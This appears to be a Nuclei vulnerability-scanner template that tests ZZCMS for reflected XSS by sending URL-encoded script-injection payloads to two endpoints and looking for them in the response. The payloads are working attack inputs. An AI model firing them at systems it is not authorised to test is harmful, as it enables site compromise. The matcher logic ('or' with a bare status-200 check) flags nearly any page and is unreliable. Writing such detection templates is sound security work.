id: zzcms-xss

info:
  name: ZZCMS XSS
  author: ritikchaddha
  severity: medium
  reference:
    - https://github.com/JcQSteven/blog/issues/20
  tags: zzcms,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/user/msg.php?action=modify&id=198445%22%2balert(233)%2b%221"
      - "{{BaseURL}}/admin/usermodify.php?id=1%22%2balert(345)%2b%22"

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "alert(233)"
        part: body
        condition: and

      - type: word
        words:
          - "alert(345)"
        part: body
        condition: and

      - type: status
        status:
          - 200
